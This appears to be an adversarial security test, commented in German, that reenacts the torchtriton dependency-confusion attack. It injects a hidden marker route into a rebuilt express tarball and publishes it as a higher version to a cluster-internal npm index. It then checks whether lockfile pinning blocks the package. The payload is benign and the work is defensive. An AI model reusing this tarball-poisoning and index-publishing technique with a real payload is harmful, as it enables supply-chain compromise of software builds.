"""Adversarialer Test: torchtriton (PyTorch, 2022) — gleichnamiges Paket an VG3.

Bildet den torchtriton-Vorfall auf den Prototyp ab. Im Vorfall fuehrte der
Paketmanager zwei Quellen zusammen (PyPI und der Nightly-Index von PyTorch), und
die vom Angreifer kontrollierte Quelle hatte Vorrang (Dependency Confusion, F3,
CAPEC-538). Der Angreifer uebernimmt dabei kein Konto, sondern veroeffentlicht
nur ein eigenes Paket unter einem Namen, der auch andernorts existiert.

Im Prototyp tritt an die Stelle der zusammengefuehrten Quellen der
clusterinterne npm-Index (Conventional/Distribute/npm-index.yaml). Er liefert
lokal abgelegte Pakete aus und leitet sonst an npmjs weiter. Der Angreifer legt
dort eine hoehere Version der direkten Abhaengigkeit express ab. Die Auswahl der
bösartigen Version trifft nicht der Producer, sondern erst die Aufloesung auf der
Build-Plattform. Verletzt wird die Annahme A3 an der Vertrauensgrenze VG3.

Payload: ein gutartiger Marker. express wird so veraendert, dass die Anwendung
auf einem versteckten Pfad einen Marker zurueckgibt. Wie bei torchtriton wird der
Code schon beim Laden des Pakets aktiv; die Anwendung selbst muss dafuer nichts
tun. Es wird kein Schaden angerichtet; geprueft wird allein, ob die bösartige
Version unbemerkt bis ins Deployment gelangt.

Baseline (npm install, ungepinnt): waehlt die hoehere Version -> vulnerable.
Gehaertet (npm ci nach Lockfile, AN3): bleibt bei der gepinnten Version. Der
Angriff laeuft durch die Pipeline, die Probe findet den Marker aber nicht ->
blocked. Die Haertung verhindert die Auswahl, nicht den Build.
"""

import base64
import copy
import hashlib
import io
import json
import tarfile
import urllib.request
import uuid

import lib

PKG = "express"
NPMJS = "https://registry.npmjs.org"
TRIGGER = "/.triton"  # versteckter Pfad des Markers, analog zum import-Trigger
# Wird nach der Initialisierung der express-App eingefuegt (gutartiger Marker).
_ANCHOR = "app.init();"
_MARKER = (
    "\n  app.use(function (req, res, next) {"
    " if (req.path === '" + TRIGGER + "')"
    " return res.status(200).send('TORCHTRITON-POC:' + (req.query.n || ''));"
    " next(); });\n"
)


def _fetch(url: str) -> bytes:
    with urllib.request.urlopen(url, timeout=60) as resp:
        return resp.read()


def _highest_v4(packument: dict) -> str:
    versions = (v for v in packument["versions"] if v.startswith("4.") and "-" not in v)
    return max(versions, key=lambda v: tuple(int(part) for part in v.split(".")))


def _poison_tarball(src: bytes, new_version: str) -> bytes:
    """Baut aus dem echten express-Tarball eine Fassung mit angehobener Version
    und eingefuegtem Marker in lib/express.js."""
    out = io.BytesIO()
    injected = False
    with tarfile.open(fileobj=io.BytesIO(src), mode="r:gz") as source, \
            tarfile.open(fileobj=out, mode="w:gz") as result:
        for member in source.getmembers():
            data = source.extractfile(member).read() if member.isfile() else None
            if member.name == "package/package.json":
                metadata = json.loads(data)
                metadata["version"] = new_version
                data = json.dumps(metadata, indent=2).encode()
            if member.name == "package/lib/express.js" and _ANCHOR.encode() in (data or b""):
                data = data.replace(_ANCHOR.encode(), _ANCHOR.encode() + _MARKER.encode(), 1)
                injected = True
            if data is not None:
                member.size = len(data)
                result.addfile(member, io.BytesIO(data))
            else:
                result.addfile(member)
    if not injected:
        raise RuntimeError("Anker app.init() in lib/express.js nicht gefunden")
    return out.getvalue()


class TorchtritonDependencyConfusion(lib.AttackTest):
    META = {
        "id": "torchtriton-dependency-confusion",
        "title": "torchtriton — gleichnamiges Paket im zweiten Paketindex",
        "vg": "VG3 (Externer Distributor -> Build-Plattform)",
        "capec": "CAPEC-538",
        "stride": "Tampering",
        "assumption": "A3",
        "incident": "torchtriton (PyTorch), 2022",
    }

    def attack(self) -> None:
        packument = json.loads(_fetch(f"{NPMJS}/{PKG}"))
        base = _highest_v4(packument)
        a, b, c = (int(x) for x in base.split("."))
        self._version = f"{a}.{b}.{c + 1}"  # eine Stufe ueber der aktuellen Version
        tarball = _poison_tarball(_fetch(packument["versions"][base]["dist"]["tarball"]),
                                  self._version)
        tgz_path = f"/_t/{PKG}-{self._version}.tgz"  # eigener Pfad, keine Kollision mit /express

        entry = copy.deepcopy(packument["versions"][base])
        entry["version"] = self._version
        entry["dist"] = {"tarball": self.index_url(tgz_path),
                         "shasum": hashlib.sha1(tarball).hexdigest(),
                         "integrity": "sha512-" + base64.b64encode(
                             hashlib.sha512(tarball).digest()).decode()}
        packument["versions"][self._version] = entry
        packument["dist-tags"]["latest"] = self._version  # npm bevorzugt latest im Bereich

        with lib.npm_index(self.cfg) as index:
            index.put(tgz_path, tarball)
            self._uploaded_paths = [tgz_path]
            index.put(f"/{PKG}", json.dumps(packument).encode())
            self._uploaded_paths.append(f"/{PKG}")
        print(f"    -> {PKG}@{self._version} im npm-Index veroeffentlicht (Angreifer, F3)")

        # Regulaerer Lauf der Kette; der Angreifer stoesst nichts selbst an.
        self._chain_started = True
        self.run_chain()

    def probe(self) -> bool:
        nonce = uuid.uuid4().hex[:12]
        installed = self._installed_version()
        with self.deployed() as url:
            status, body = lib.http_get(f"{url}{TRIGGER}?n={nonce}")
            _, normal = lib.http_get(url + "/")
        reachable = status == 200 and body == "TORCHTRITON-POC:" + nonce
        camouflage = '"message":"demo-app"' in normal
        if reachable:
            self.detail = (
                f"bösartiges {PKG}@{self._version} aufgeloest und erreichbar "
                f"({TRIGGER}), Marker bestaetigt; Tarnung "
                f"{'intakt' if camouflage else 'GEBROCHEN'}; im Pod: {installed}"
            )
        else:
            self.detail = (
                f"Marker nicht erreichbar; im Pod: {installed}, "
                f"Angreifer-Version war {self._version}"
            )
        return reachable

    def cleanup(self) -> None:
        version = getattr(self, "_version", None)
        paths = getattr(self, "_uploaded_paths", [])
        if paths:
            with lib.npm_index(self.cfg) as index:
                for path in reversed(paths):
                    index.delete(path)
            print(f"    -> {PKG}@{version} aus dem npm-Index entfernt")
            paths.clear()
        # Ein Fehler vor der Pipeline kann das Deployment nicht verändert haben.
        if getattr(self, "_chain_started", False):
            self.rebuild()

    # ---- Helfer ---------------------------------------------------------- #
    def index_url(self, path: str) -> str:
        """Clusterinterne URL des Index, wie sie im Tarball-Feld stehen muss."""
        c = self.cfg
        return f"http://{c['npm_service']}.{c['npm_namespace']}.svc.cluster.local:{c['npm_read_port']}{path}"

    def _installed_version(self) -> str:
        """Im laufenden Pod installierte express-Version (zur Einordnung im Report)."""
        out = lib.run(lib.kubectl(
            self.cfg, "exec", "-n", self.cfg["deploy_ns"],
            f"deployment/{self.cfg['deployment']}", "--",
            "node", "-p", "require('express/package.json').version",
        ), check=False).stdout.strip()
        return f"{PKG}@{out}" if out else "unbekannt"
